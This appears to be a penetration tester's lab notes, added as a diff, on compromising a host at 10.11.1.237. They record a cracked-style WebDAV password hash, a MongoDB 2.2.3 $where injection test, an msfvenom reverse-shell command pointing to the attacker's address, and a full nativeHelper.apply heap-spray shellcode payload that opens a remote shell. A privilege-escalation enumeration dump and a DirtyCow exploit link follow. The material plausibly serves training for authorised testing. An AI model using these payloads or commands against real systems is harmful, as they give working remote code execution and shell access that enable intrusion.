@@ -1,0 +1,322 @@
+# login page
+http://10.11.1.237/webdav
+
+# found password hash
+https://10.11.1.237/web1/passwd.dav
+test:$apr1$GDBY7mKy$otQYfmnQX8zRGXW96Y6ff0
+
+# interesting pages
+https://10.11.1.237/test
+
+# possible exploits
+----------------------------------------------------------------- ----------------------------
+Exploit Title                                                    |  Path
+----------------------------------------------------------------- ----------------------------
+MongoDB - 'conn' Mongo Object Remote Code Execution              | multiple/remote/38669.txt
+MongoDB - nativeHelper.apply Remote Code Execution (Metasploit)  | linux/remote/24935.rb
+MongoDB 2.2.3 - nativeHelper.apply Remote Code Execution         | linux/remote/24947.txt
+
+# found exploit
+MongoDB 2.2.3 - nativeHelper.apply Remote Code Execution  | linux/remote/24947.txt
+
+# confirm code injection (system hangs)
+Server:		db.my_collection.find({$where:'<input>'})
+payload:	'; sleep(100);'
+exploit:	db.my_collection.find({$where:''; sleep(100);''})
+
+# create payload
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.201 LPORT=12345 -f js_le -e generic/none
+
+# code injection (get shell)
+# remember escape the rest of the code
+'; shellcode=unescape("%udb31%ue3f7%u4353%u6a53%u8902%ub0e1%ucd66%u9380%ub059%ucd3f%u4980%uf979%uc068%u77a8%u68c9%u0002%u3930%ue189%u66b0%u5150%ub353%u8903%ucde1%u5280%u6e68%u732f%u6868%u2f2f%u6962%ue389%u5352%ue189%u0bb0%u80cd"); sizechunk=0x1000; chunk=""; for(i=0;i<sizechunk;i++){ chunk+=unescape("%u9090%u9090"); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i<25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape("%uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000"); sizechunk2=0x1000; chunk2=""; for(i=0;i<sizechunk2;i++){ chunk2+=unescape("%u5a70%u0805"); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i<25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({"x" : 0x836e204}, ["A"+"\x26\x18\x35\x08"+"MongoSploit!"+"\x58\x71\x45\x08"+"sthack is a nice place to be"+"\x6c\x5a\x05\x08"+"\x20\x20\x20\x20"+"\x58\x71\x45\x08"]);'#
+
+
+################################
+##### Privilege Escalation #####
+################################
+
+----------------------------------------
+# Hostname
+----------------------------------------
+humble
+
+
+----------------------------------------
+# OS Version & Architecture
+----------------------------------------
+Linux version 3.2.0-4-486
+Architecture: i686
+
+
+----------------------------------------
+# Users
+----------------------------------------
+backup:x:34:34:backup:/var/backups:/bin/sh                                                                                                    
+bin:x:2:2:bin:/bin:/bin/sh
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+davtest:x:1002:1002::/home/davtest:/bin/sh
+games:x:5:60:games:/usr/games:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+mongodb:x:1000:1000::/home/mongodb:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+root:x:0:0:root:/root:/bin/bash
+sys:x:3:3:sys:/dev:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+
+
+----------------------------------------
+# Processes & Services
+----------------------------------------
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.1   2280   616 ?        Ss   May26   0:04 init [2]  
+root         2  0.0  0.0      0     0 ?        S    May26   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        S    May26   0:09 [ksoftirqd/0]
+root         5  0.0  0.0      0     0 ?        S    May26   0:06 [kworker/u:0]
+root         6  0.0  0.0      0     0 ?        S    May26   0:01 [watchdog/0]
+root         7  0.0  0.0      0     0 ?        S<   May26   0:00 [cpuset]
+root         8  0.0  0.0      0     0 ?        S<   May26   0:00 [khelper]
+root         9  0.0  0.0      0     0 ?        S    May26   0:00 [kdevtmpfs]
+root        10  0.0  0.0      0     0 ?        S<   May26   0:00 [netns]
+root        11  0.0  0.0      0     0 ?        S    May26   0:01 [sync_supers]
+root        12  0.0  0.0      0     0 ?        S    May26   0:00 [bdi-default]
+root        13  0.0  0.0      0     0 ?        S<   May26   0:00 [kintegrityd]
+root        14  0.0  0.0      0     0 ?        S<   May26   0:00 [kblockd]
+root        15  0.0  0.0      0     0 ?        S    May26   0:00 [khungtaskd]
+root        16  0.0  0.0      0     0 ?        S    May26   0:00 [kswapd0]
+root        17  0.0  0.0      0     0 ?        SN   May26   0:00 [ksmd]
+root        18  0.0  0.0      0     0 ?        S    May26   0:00 [fsnotify_mark]
+root        19  0.0  0.0      0     0 ?        S<   May26   0:00 [crypto]
+root        22  0.0  0.0      0     0 ?        S    May26   0:06 [kworker/0:1]
+root        87  0.0  0.0      0     0 ?        S<   May26   0:00 [ata_sff]
+root        88  0.0  0.0      0     0 ?        S<   May26   0:00 [mpt_poll_0]
+root        90  0.0  0.0      0     0 ?        S<   May26   0:00 [mpt/0]
+root       155  0.0  0.0      0     0 ?        S    May26   0:00 [scsi_eh_0]
+root       157  0.0  0.0      0     0 ?        S    May26   0:00 [scsi_eh_1]
+root       159  0.0  0.0      0     0 ?        S    May26   0:00 [scsi_eh_2]
+root       160  0.0  0.0      0     0 ?        S    May26   0:00 [kworker/u:1]
+root       194  0.0  0.0      0     0 ?        S    May26   0:26 [jbd2/sda1-8]
+root       195  0.0  0.0      0     0 ?        S<   May26   0:00 [ext4-dio-unwri
+root       339  0.0  0.1   2956   664 ?        Ss   May26   0:00 udevd --daemon
+root       432  0.0  0.0      0     0 ?        S<   May26   0:00 [ttm_swap]
+root       470  0.0  0.0   2952   360 ?        S    May26   0:00 udevd --daemon
+root       471  0.0  0.0   2952   340 ?        S    May26   0:00 udevd --daemon
+root       512  0.0  0.0      0     0 ?        S<   May26   0:00 [kpsmoused]
+root      1663  0.0  0.0      0     0 ?        S    May26   0:09 [flush-8:0]
+root      1785  0.0  0.6  12040  3404 ?        S    May26   5:36 /usr/sbin/vmtoo
+root      1808  0.0  0.2  14412  1308 ?        S    May26   0:00 /usr/lib/vmware
+root      1952  0.0  0.1   2376   788 ?        Ss   May26   0:00 /sbin/rpcbind -
+statd     1983  0.0  0.1   2696   980 ?        Ss   May26   0:00 /sbin/rpc.statd
+root      1988  0.0  0.0      0     0 ?        S<   May26   0:00 [rpciod]
+root      1990  0.0  0.0      0     0 ?        S<   May26   0:00 [nfsiod]
+root      1997  0.0  0.0   2576   280 ?        Ss   May26   0:00 /usr/sbin/rpc.i
+root      2206  0.0  0.4  29040  2488 ?        Sl   May26   0:13 /usr/sbin/rsysl
+root      2303  0.0  0.0   1876   420 ?        Ss   May26   0:00 /usr/sbin/acpid
+101       2342  0.0  0.1   3128   724 ?        Ss   May26   0:00 /usr/bin/dbus-d
+root      2378  0.0  0.8   9356  4440 ?        Ss   May26   0:14 /usr/sbin/apach
+root      2461  0.0  0.3  18288  1740 ?        Ssl  May26   0:08 /usr/sbin/Netwo
+root      2482  0.0  0.2   6888  1228 ?        S    May26   0:00 /usr/sbin/modem
+daemon    2491  0.0  0.0   2152   208 ?        Ss   May26   0:00 /usr/sbin/atd
+avahi     2518  0.0  0.2   3152  1128 ?        S    May26   0:04 avahi-daemon: r
+avahi     2519  0.0  0.0   3152   252 ?        S    May26   0:00 avahi-daemon: c
+root      2544  0.0  0.1   4484   816 ?        Ss   May26   0:00 /usr/sbin/bluet
+root      2554  0.0  0.0      0     0 ?        S<   May26   0:00 [krfcommd]
+root      2620  0.0  0.1   3836   732 ?        Ss   May26   0:01 /usr/sbin/cron
+root      2906  0.0  0.0   2324   284 ?        S    May26   0:00 /usr/bin/daemon
+root      2908  0.0  0.1   1932   632 ?        S    May26   0:00 /bin/sh /etc/in
+root      2947  0.0  0.1   6464   616 ?        Ss   May26   0:00 /usr/sbin/sshd
+104       3006  0.0  0.1   7424   636 ?        Ss   May26   0:00 /usr/sbin/exim4
+root      3037  0.0  0.0   1848   476 ?        Ss   May26   0:21 /usr/sbin/minis
+root      3048  0.0  0.1   3780   652 tty1     Ss+  May26   0:00 /sbin/getty 384
+root      3049  0.0  0.1   3780   652 tty2     Ss+  May26   0:00 /sbin/getty 384
+root      3050  0.0  0.1   3780   652 tty3     Ss+  May26   0:00 /sbin/getty 384
+root      3051  0.0  0.1   3780   652 tty4     Ss+  May26   0:00 /sbin/getty 384
+root      3052  0.0  0.1   3780   652 tty5     Ss+  May26   0:00 /sbin/getty 384
+root      3053  0.0  0.1   3780   652 tty6     Ss+  May26   0:00 /sbin/getty 384
+root      4541  0.0  0.1   4776  1016 ?        S    May26   0:00 su - mongodb -c
+mongodb   4543  0.0  0.0   1932   504 ?        Ss   May26   0:00 -su -c /opt/mon
+mongodb   4546 1017  0.1   1932   548 ?        S    23:10  25:57 //bin/sh
+
+
+----------------------------------------
+# Network Information (IP, Route)
+----------------------------------------
+Link encap:Ethernet  HWaddr 00:50:56:86:ba:6c  
+inet addr:10.11.1.237  Bcast:10.11.1.255  Mask:255.255.254.0
+inet6 addr: fe80::250:56ff:fe86:ba6c/64 Scope:Link
+UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+RX packets:2223 errors:0 dropped:203 overruns:0 frame:0
+TX packets:1016 errors:0 dropped:0 overruns:0 carrier:0
+collisions:0 txqueuelen:1000 
+RX bytes:981266 (958.2 KiB)  TX bytes:213964 (208.9 KiB)
+
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         10.11.0.1       0.0.0.0         UG    0      0        0 eth0
+10.11.0.0       *               255.255.254.0   U     0      0        0 eth0
+Address                  HWtype  HWaddress           Flags Mask            Iface
+10.11.0.1                ether   00:50:56:86:5c:fb   C                     eth0
+
+
+----------------------------------------
+# Firewall Status & Rules
+----------------------------------------
+
+
+
+----------------------------------------
+# Scheduled Tasks
+----------------------------------------
+-rw-r--r-- 1 root root  722 Jul  3  2012 /etc/crontab
+
+/etc/cron.d:
+total 24K
+drwxr-xr-x   2 root root 4.0K Mar 29  2013 .
+drwxr-xr-x 126 root root  12K Dec 19  2019 ..
+-rw-r--r--   1 root root  102 Jul  3  2012 .placeholder
+-rw-r--r--   1 root root  244 May 22  2012 anacron
+
+/etc/cron.daily:
+total 80K
+drwxr-xr-x   2 root root 4.0K Dec 26  2013 .
+drwxr-xr-x 126 root root  12K Dec 19  2019 ..
+-rw-r--r--   1 root root  102 Jul  3  2012 .placeholder
+-rwxr-xr-x   1 root root  311 May 22  2012 0anacron
+-rwxr-xr-x   1 root root  633 Mar  4  2013 apache2
+-rwxr-xr-x   1 root root  15K Dec 13  2012 apt
+-rwxr-xr-x   1 root root  314 Nov  5  2012 aptitude
+-rwxr-xr-x   1 root root  355 Jun 11  2012 bsdmainutils
+-rwxr-xr-x   1 root root  256 Oct 20  2012 dpkg
+-rwxr-xr-x   1 root root 4.1K Jan  2  2013 exim4-base
+-rwxr-xr-x   1 root root   89 May 17  2012 logrotate
+-rwxr-xr-x   1 root root 1.4K Jun 18  2012 man-db
+-rwxr-xr-x   1 root root  606 Sep 25  2010 mlocate
+-rwxr-xr-x   1 root root  249 May 25  2012 passwd
+
+/etc/cron.hourly:
+total 20K
+drwxr-xr-x   2 root root 4.0K Mar 29  2013 .
+drwxr-xr-x 126 root root  12K Dec 19  2019 ..
+-rw-r--r--   1 root root  102 Jul  3  2012 .placeholder
+
+/etc/cron.monthly:
+total 24K
+drwxr-xr-x   2 root root 4.0K Mar 29  2013 .
+drwxr-xr-x 126 root root  12K Dec 19  2019 ..
+-rw-r--r--   1 root root  102 Jul  3  2012 .placeholder
+-rwxr-xr-x   1 root root  313 May 22  2012 0anacron
+
+/etc/cron.weekly:
+total 32K
+drwxr-xr-x   2 root root 4.0K Mar 29  2013 .
+drwxr-xr-x 126 root root  12K Dec 19  2019 ..
+-rw-r--r--   1 root root  102 Jul  3  2012 .placeholder
+-rwxr-xr-x   1 root root  312 May 22  2012 0anacron
+-rwxr-xr-x   1 root root  748 Dec 28  2011 apt-xapian-index
+-rwxr-xr-x   1 root root  907 Jun 18  2012 man-db
+
+
+----------------------------------------
+# Readable/Writable Files & Directories
+----------------------------------------
+/data
+/data/db
+/data/db/journal
+/run/shm
+/run/lock
+/opt/mongodb-linux-i686-2.2.3
+/opt/mongodb-linux-i686-2.2.3/bin
+/opt/davfs2-1.4.6
+/opt/davfs2-1.4.6/src
+/opt/davfs2-1.4.6/po
+/opt/davfs2-1.4.6/etc
+/opt/davfs2-1.4.6/man
+/opt/davfs2-1.4.6/man/de
+/opt/davfs2-1.4.6/man/es
+/opt/davfs2-1.4.6/config
+/tmp
+/proc/32675/task/32675/fd
+/proc/32675/fd
+/var/tmp
+
+
+----------------------------------------
+# Installed Applications & Patch Levels
+----------------------------------------
+
+
+
+----------------------------------------
+# Unmounted Disks
+----------------------------------------
+sda      8:0    0     6G  0 disk 
+|-sda1   8:1    0   5.7G  0 part /
+|-sda2   8:2    0     1K  0 part 
+`-sda5   8:5    0   301M  0 part [SWAP]
+sr0     11:0    1  1024M  0 rom 
+
+
+----------------------------------------
+# Device Drivers and Kernel Modules
+----------------------------------------
+
+
+
+----------------------------------------
+# AutoElevated Binaries
+----------------------------------------
+/sbin/mount.nfs
+/opt/vmware-tools-distrib/lib/bin64/vmware-user-suid-wrapper
+/opt/vmware-tools-distrib/lib/bin32/vmware-user-suid-wrapper
+/bin/ping6
+/bin/su
+/bin/umount
+/bin/ping
+/bin/fusermount
+/bin/mount
+/usr/sbin/exim4
+/usr/sbin/pppd
+/usr/local/sbin/mount.davfs
+/usr/bin/sudoedit
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/traceroute6.iputils
+/usr/bin/gpasswd
+/usr/bin/procmail
+/usr/bin/at
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/pt_chown
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+
+
+----------------------------------------
+# Public Exploits/References
+----------------------------------------
+https://github.com/exrienz/DirtyCow
+
+
+
+
+
+
+
+
+
+
+
+
+
